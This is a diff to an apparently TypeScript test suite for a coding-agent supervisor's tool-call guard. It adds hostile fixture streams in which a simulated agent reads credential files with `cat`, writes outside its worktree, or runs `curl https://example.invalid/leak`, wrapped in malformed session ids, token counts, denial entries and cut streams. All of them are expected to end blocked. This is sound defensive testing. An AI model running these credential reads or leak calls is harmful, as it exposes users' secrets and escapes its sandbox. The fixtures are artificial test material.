@@ -53,7 +53,7 @@
  * negative and fractional, a `step_index` reused after a benign `ls`, and a soft denial beside a guard verdict (as Grok
  * Build T4.26). Lines that are not a tool step stay
  * `unknown`. A stream cut inside a line is not a hostile-category stream (the supervisor ends it
- * `OUTPUT_PROTOCOL_ERROR`); `antigravityPartialStreams` replays a cut before the hostile call and a cut after it, at
+ * `OUTPUT_PROTOCOL_ERROR`); `antigravityPartialStreams` replays a cut before the hostile call, inside it and after it, at
  * exit 0 and exit 1, in every blocked category. A valid tool step whose command is not an own string — a non-string, a
  * path key alone in a bypass run, or a Git write only in a container a benign higher-precedence container shadows —
  * is still invisible to the guard and, with a `SUCCESS` envelope, still success, so those shapes are not in the
@@ -402,6 +402,60 @@ const guardedError = (name: string, category: HostileStream["category"], command
     ...shell(`${command} && ${GIT_WRITE}`),
     ERROR_RESULT,
   ],
+});
+
+/** A `result` line with the clean envelope's fields, `fields` overriding or adding to them. */
+const resultWith = (fields: Record<string, unknown>) =>
+  JSON.stringify({
+    event: "result",
+    result: {
+      conversation_id: SID,
+      status: "SUCCESS",
+      response: "",
+      duration_seconds: 2,
+      num_turns: 1,
+      usage: USAGE,
+      ...fields,
+    },
+  });
+
+/**
+ * A guarded hostile call (chained with a Git write) inside a stream anomaly the parser already fails closed on: `head`
+ * replaces the recorded `init` line and `tail` follows the call. The guard's verdict outranks the anomaly's own code
+ * (`OUTPUT_PROTOCOL_ERROR`, `TOOL_FAILURE`), so the run ends `PERMISSION_BLOCKED` (ADR-0039).
+ */
+const guardedAnomaly = (
+  name: string,
+  category: HostileStream["category"],
+  command: string,
+  exitCode: number,
+  head: string[],
+  tail: string[],
+): HostileStream => ({
+  name: `${name}${exitCode === 0 ? "" : `, exit ${exitCode}`}`,
+  category,
+  exitCode,
+  failureCode: "PERMISSION_BLOCKED",
+  lines: [META(name, exitCode), ...head, ...shell(`${command} && ${GIT_WRITE}`), ...tail],
+});
+
+/**
+ * Hypothetical denial shapes (only `[{"action":"command","display_name":"RunCommand"}]` was recorded, C7, C18) with
+ * no Git write: the provider's report alone ends the run `PERMISSION_BLOCKED`, whatever the entry looks like.
+ */
+const deniedShape = (
+  name: string,
+  category: HostileStream["category"],
+  command: string,
+  exitCode: number,
+  denied: unknown,
+  status = "SUCCESS",
+): HostileStream => ({
+  name: `${name}${exitCode === 0 ? "" : `, exit ${exitCode}`}`,
+  category,
+  exitCode,
+  failureCode: "PERMISSION_BLOCKED",
+  lines: [META(name, exitCode), INIT, ...shell(command), resultWith({ status, denied_actions: denied })],
 });
 
 const antigravityCase: AdapterLegCase = {
@@ -1164,6 +1218,194 @@ const antigravityCase: AdapterLegCase = {
         deniedResult(DENIED_COMMAND),
       ],
     },
+    // Session-id anomalies the parser fails closed on (`#bind`), beyond the changed step id above (as Grok Build T4.26):
+    // an id that is not one safe token on `init` or on `result`, a `result` for another conversation, and a second
+    // `init` with another id. Each is `OUTPUT_PROTOCOL_ERROR` on its own; the guard verdict outranks it.
+    ...[0, 1].flatMap((exit) => [
+      guardedAnomaly(
+        "shell read of a credential path under an unsafe init conversation id",
+        "credential_read",
+        `cat ${fx.claudeCredentialsPath}`,
+        exit,
+        [JSON.stringify({ event: "init", conversation_id: "--unsafe-id", init: { cwd: "/work/tree" } })],
+        exit === 0 ? [CLEAN_RESULT] : [],
+      ),
+      guardedAnomaly(
+        "shell write outside the worktree under an unsafe result conversation id",
+        "out_of_worktree_write",
+        `touch ${fx.outsideSentinel}`,
+        exit,
+        [INIT],
+        [resultWith({ conversation_id: "id\nwith-newline" })],
+      ),
+      guardedAnomaly(
+        "shell network call, result for another conversation",
+        "network",
+        "curl https://example.invalid/leak",
+        exit,
+        [INIT],
+        [resultWith({ conversation_id: OTHER_SID })],
+      ),
+      guardedAnomaly(
+        "shell read of a credential path, second init with another conversation id",
+        "credential_read",
+        `cat ${fx.codexAuthPath}`,
+        exit,
+        [INIT, JSON.stringify({ event: "init", conversation_id: OTHER_SID, init: { cwd: "/work/tree" } })],
+        exit === 0 ? [CLEAN_RESULT] : [],
+      ),
+    ]),
+    // Q-86: `SUCCESS` with no reported tokens is what a print timeout returns (C10) and is never a success; with a Git
+    // write the guard's verdict, not `TOOL_FAILURE`, ends the run. Zero, missing, negative and non-number totals.
+    guardedAnomaly(
+      "shell read of a credential path, SUCCESS with total_tokens 0",
+      "credential_read",
+      `cat ${fx.claudeCredentialsPath}`,
+      0,
+      [INIT],
+      [resultWith({ usage: { ...USAGE, total_tokens: 0 } })],
+    ),
+    guardedAnomaly(
+      "shell write outside the worktree, SUCCESS with no usage",
+      "out_of_worktree_write",
+      `touch ${fx.outsideSentinel}`,
+      0,
+      [INIT],
+      [resultWith({ usage: undefined })],
+    ),
+    guardedAnomaly(
+      "shell network call, SUCCESS with a negative total_tokens",
+      "network",
+      "curl https://example.invalid/leak",
+      1,
+      [INIT],
+      [resultWith({ usage: { ...USAGE, total_tokens: -24 } })],
+    ),
+    guardedAnomaly(
+      "shell read of a credential path, SUCCESS with a string total_tokens",
+      "credential_read",
+      `cat ${fx.codexAuthPath}`,
+      1,
+      [INIT],
+      [resultWith({ usage: { ...USAGE, total_tokens: "24" } })],
+    ),
+    // `error` was a string (C6, C10, C13); a non-string one is an unknown provider error, outranked by the guard.
+    guardedAnomaly(
+      "shell write outside the worktree, non-string error on a SUCCESS envelope",
+      "out_of_worktree_write",
+      `touch ${fx.outsideSentinel}`,
+      0,
+      [INIT],
+      [resultWith({ error: { message: "synthetic" } })],
+    ),
+    guardedAnomaly(
+      "shell network call, non-string error on an ERROR envelope",
+      "network",
+      "curl https://example.invalid/leak",
+      1,
+      [INIT],
+      [resultWith({ status: "ERROR", error: 42 })],
+    ),
+    // An empty or null `denied_actions` reports no denial; the guard alone ends the run.
+    guardedAnomaly(
+      "shell read of a credential path, empty denied_actions",
+      "credential_read",
+      `cat ${fx.claudeCredentialsPath}`,
+      0,
+      [INIT],
+      [resultWith({ denied_actions: [] })],
+    ),
+    guardedAnomaly(
+      "shell write outside the worktree, null denied_actions",
+      "out_of_worktree_write",
+      `touch ${fx.outsideSentinel}`,
+      1,
+      [INIT],
+      [resultWith({ denied_actions: null })],
+    ),
+    // Unrecorded denial entry shapes with no Git write: the provider's report alone blocks the run.
+    deniedShape(
+      "shell read of a credential path, denied_actions entry a bare string",
+      "credential_read",
+      `cat ${fx.claudeCredentialsPath}`,
+      0,
+      ["RunCommand"],
+    ),
+    deniedShape(
+      "shell write outside the worktree, denied_actions entry an empty object",
+      "out_of_worktree_write",
+      `touch ${fx.outsideSentinel}`,
+      1,
+      [{}],
+    ),
+    deniedShape(
+      "shell network call, denied_actions entry with action only",
+      "network",
+      "curl https://example.invalid/leak",
+      0,
+      [{ action: "command" }],
+    ),
+    deniedShape(
+      "shell network call, a null entry before the recorded denial",
+      "network",
+      "curl https://example.invalid/leak",
+      1,
+      [null, DENIED_COMMAND],
+    ),
+    deniedShape(
+      "shell read of a credential path, denied_actions a string",
+      "credential_read",
+      `cat ${fx.codexAuthPath}`,
+      1,
+      "RunCommand",
+    ),
+    deniedShape(
+      "shell write outside the worktree, over-long display_name",
+      "out_of_worktree_write",
+      `touch ${fx.outsideSentinel}`,
+      0,
+      [{ action: "command", display_name: "R".repeat(500) }],
+    ),
+    // The recorded denial in an `ERROR` envelope at exit 0, and at exit 2 and 137 (no such run was recorded).
+    ...[0, 2, 137].flatMap((exit) => [
+      deniedShape(
+        "shell read of a credential path, soft-denied in an ERROR envelope",
+        "credential_read",
+        `cat ${fx.claudeCredentialsPath}`,
+        exit,
+        [DENIED_COMMAND],
+        "ERROR",
+      ),
+      deniedShape(
+        "shell write outside the worktree, soft-denied in an ERROR envelope",
+        "out_of_worktree_write",
+        `touch ${fx.outsideSentinel}`,
+        exit,
+        [DENIED_COMMAND],
+        "ERROR",
+      ),
+      deniedShape(
+        "shell network call, soft-denied in an ERROR envelope",
+        "network",
+        "curl https://example.invalid/leak",
+        exit,
+        [DENIED_COMMAND],
+        "ERROR",
+      ),
+    ]),
+    ...[3, 137].map(
+      (exit): HostileStream => ({
+        name: `only unknown event kinds, exit ${exit}`,
+        category: "unknown_events",
+        exitCode: exit,
+        failureCode: "TOOL_FAILURE",
+        lines: [
+          META("Event kinds below are invented; the adapter must report them unknown.", exit),
+          JSON.stringify({ event: "synthetic_unknown_kind", conversation_id: SID }),
+          JSON.stringify({ event: "step_update", step_type: "tool", step_index: null }),
+        ],
+      }),
+    ),
     {
       name: "only unknown event kinds, exit 2",
       category: "unknown_events",
@@ -1248,7 +1490,7 @@ const antigravityCase: AdapterLegCase = {
 export default antigravityCase;
 
 /**
- * Partial streams (T4.36, as T4.26): the output ends inside a line, after a hostile call or before it. The supervisor
+ * Partial streams (T4.36, as T4.26): the output ends inside a line, before a hostile call, inside it or after it. The supervisor
  * ends such a run `OUTPUT_PROTOCOL_ERROR` on the unparseable line (`src/exec/supervisor.ts`), which outranks the
  * tool-call guard. They are not hostile-category streams (those must end blocked), so
  * `test/malicious/adapter-leg.test.ts` replays them on their own: never success, hostile checkout untouched.
@@ -1289,6 +1531,18 @@ export const antigravityPartialStreams = (fx: MaliciousFixture): HostileStream[]
         exitCode,
         failureCode: "OUTPUT_PROTOCOL_ERROR",
         lines: [META(`${category}, then output cut inside a step_update`, exitCode), INIT, ...shell(command), afterCut],
+      },
+      {
+        // The hostile step_update itself is cut inside its command, so no readable line carries the Git write.
+        name: `output cut inside the ${category} step_update, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "OUTPUT_PROTOCOL_ERROR",
+        lines: [
+          META(`output cut inside the ${category} step_update`, exitCode),
+          INIT,
+          ...((line) => [line.slice(0, line.indexOf("git ") + 6)])(shell(command)[0] ?? ""),
+        ],
       },
     ]);
   });
